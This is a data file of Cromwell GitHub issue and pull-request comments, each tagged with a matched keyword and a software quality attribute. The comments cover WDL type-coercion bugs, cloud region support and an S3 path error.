https://github.com/broadinstitute/cromwell/pull/6487#issuecomment-919073756:267,Integrability,depend,depend,267,"If this error happened in production, the Cromwell process would terminate quickly and... presumably restarted by k8s or something. With these changes, the Cromwell process will sleep instead of terminating. Will this negatively impact startup time? I guess it would depend on how long a cold start takes to start initializing backends; I don't know how long that takes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6487#issuecomment-919073756
https://github.com/broadinstitute/cromwell/pull/6489#issuecomment-936307629:100,Deployability,release,release,100,Actually one minor request: could you please rebase on `develop` and add an entry to the version 70 release notes for this added functionality with a credit to yourself. 🙂,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6489#issuecomment-936307629
https://github.com/broadinstitute/cromwell/pull/6489#issuecomment-936544171:102,Deployability,release,release,102,> Actually one minor request: could you please rebase on `develop` and add an entry to the version 70 release notes for this added functionality with a credit to yourself. slightly_smiling_face. I will do it,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6489#issuecomment-936544171
https://github.com/broadinstitute/cromwell/pull/6496#issuecomment-922037489:110,Testability,log,logic,110,"LGTM, withholding thumb since there's a possibility of additional code changes related to the transient retry logic.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6496#issuecomment-922037489
https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922859035:79,Modifiability,config,config,79,"Hi Christina,; Have you tried using any other location than us-central1 in the config, the tutorial seems to fail for me if I use any other location",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922859035
https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922870328:87,Modifiability,config,config,87,"@hnawar I tried us-east1, which failed. But then I saw a comment in one of the example config files that only us-central1 and europe-west2 are supported by the API, so I used us-central1. I did not actually try europe-west2.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922870328
https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922906208:89,Modifiability,config,config,89,"> @hnawar I tried us-east1, which failed. But then I saw a comment in one of the example config files that only us-central1 and europe-west2 are supported by the API, so I used us-central1. I did not actually try europe-west2. @cahrens The Life Sciences API now supports additional zones and a US region (see https://cloud.google.com/life-sciences/docs/concepts/locations )us-east1 is not in the list but other us locations now include us-west2 and us . I could not get the hello.wdl or the gatk4-germline-snps-indels to run in europe-west2 or any region other than us--central1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6497#issuecomment-922906208
https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:40,Availability,echo,echo,40,"Indeed, the following workflow:; ```; $ echo 'version development. workflow main {; input {; Directory d = ""/etc""; }; }' > main.wdl; ```; Will fail the womtool parser:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228
https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:921,Availability,echo,echo,921,"Indeed, the following workflow:; ```; $ echo 'version development. workflow main {; input {; Directory d = ""/etc""; }; }' > main.wdl; ```; Will fail the womtool parser:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228
https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:1007,Availability,echo,echo,1007,"ollowing workflow:; ```; $ echo 'version development. workflow main {; input {; Directory d = ""/etc""; }; }' > main.wdl; ```; Will fail the womtool parser:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String` the same wa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228
https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:1185,Availability,echo,echo,1185,"ava -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String` the same way as it is allowed to coerce `File` to `String`:; ```; $ echo 'version development. workflow main {; input {; File f; }; String s = sub(f, ""x"", ""y""); }' > main.wdl; ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228
https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:2070,Availability,echo,echo,2070,"'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String` the same way as it is allowed to coerce `File` to `String`:; ```; $ echo 'version development. workflow main {; input {; File f; }; String s = sub(f, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Success!; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228
https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:201,Security,validat,validate,201,"Indeed, the following workflow:; ```; $ echo 'version development. workflow main {; input {; Directory d = ""/etc""; }; }' > main.wdl; ```; Will fail the womtool parser:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228
https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:1098,Security,validat,validate,1098,"d = ""/etc""; }; }' > main.wdl; ```; Will fail the womtool parser:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String` the same way as it is allowed to coerce `File` to `String`:; ```; $ echo 'version development. workfl",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228
https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:1346,Security,validat,validate,1346,"'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String` the same way as it is allowed to coerce `File` to `String`:; ```; $ echo 'version development. workflow main {; input {; File f; }; String s = sub(f, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Success!; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228
https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228:2226,Security,validat,validate,2226,"'main' (reason 1 of 1): Failed to process input declaration 'Directory d = ""/etc""' (reason 1 of 1): Cannot coerce expression of type 'String' to 'Directory'; ```; Despite [coercion](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#type-coercion) from `String` to `Directory` being allowed by the WDL specification and this being among the examples (see [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#task-inputs) and [here](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#primitive-types)). Surprisingly, you can coerce a `String` into a `Directory` if it comes from an input file:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; }' > main.wdl. $ echo '{; ""main.d"": ""/etc""; }' > main.json; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl -i main.json; Success!; ```. Also puzzling is the following:; ```; $ echo 'version development. workflow main {; input {; Directory d; }; String s = sub(d, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Failed to process workflow definition 'main' (reason 1 of 1): Failed to process declaration 'String s = sub(d, ""x"", ""y"")' (reason 1 of 1): Failed to process expression 'sub(d, ""x"", ""y"")' (reason 1 of 1): Invalid parameter 'IdentifierLookup(d)'. Expected 'File' but got 'Directory'; ```; First of all, it is unclear why womtool claims sub expects a `File`, as the definition of [sub](https://github.com/openwdl/wdl/blob/main/versions/development/SPEC.md#string-substring-string-string) is `String sub(String, String, String)` so `File` is not something that should be expected. Here it should be allowed to coerce `Directory` to `String` the same way as it is allowed to coerce `File` to `String`:; ```; $ echo 'version development. workflow main {; input {; File f; }; String s = sub(f, ""x"", ""y""); }' > main.wdl; ```; And then:; ```; $ java -jar womtool-67.jar validate main.wdl; Success!; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-925057228
https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-1737682362:684,Usability,simpl,simple,684,"> Hi, I'm wondering what's the status here. We are bit by this and we really want to use Directory type because that saves a lot of troubles.; > ; > Without careful check, I'm wondering if it's just failed wom check and the String to Directory conversion actually works in Cromwell? If so, I'm wondering if [this code](https://github.com/broadinstitute/cromwell/blob/develop/wom/src/main/scala/wom/types/WomPrimitiveType.scala#L8-L9) is relevant and could partially fix the problem (not the `sub` function I think) if `WomUnlistedDirectoryType` is added to `WomStringType` coercion targets. Sorry for the random @ but may I get some eyes from contributors here? Just to see whether a simple fix on `coercionMap` is meaningful and helpful? Happy to contribute with PR. Maybe @aednichols ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6501#issuecomment-1737682362
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:572,Availability,error,error,572,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:588,Security,Access,AccessDenied,588,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:644,Security,Access,Access,644,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:159,Testability,test,test,159,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:183,Testability,test,test,183,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:349,Testability,log,log,349,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185
https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185:397,Testability,log,log,397,"I agree, it looks like introducing `s3.amazonaws.com` before the bucket path breaks the path. What version of Cromwell are you on?; ```; > aws s3 ls ""s3://aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/""; 2019-04-23 15:41:46 0 ; 2019-04-23 15:46:35 2 local_disk-rc.txt; 2019-04-23 15:46:36 0 local_disk-stderr.log; 2019-04-23 15:46:35 1304 local_disk-stdout.log; 2019-04-23 15:41:46 1117 script; ```; ```; > aws s3 ls ""s3://s3.amazonaws.com/aen-test/cromwell-execution/test/1e346768-e95f-415c-9afd-5b1e8886ff02/call-local_disk/"". An error occurred (AccessDenied) when calling the ListObjectsV2 operation: Access Denied; ```; I think what the code is going for is [introducing an endpoint](https://docs.aws.amazon.com/general/latest/gr/s3.html) which is supported when using HTTP/REST but apparently not with the `s3://` scheme.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6504#issuecomment-926897185
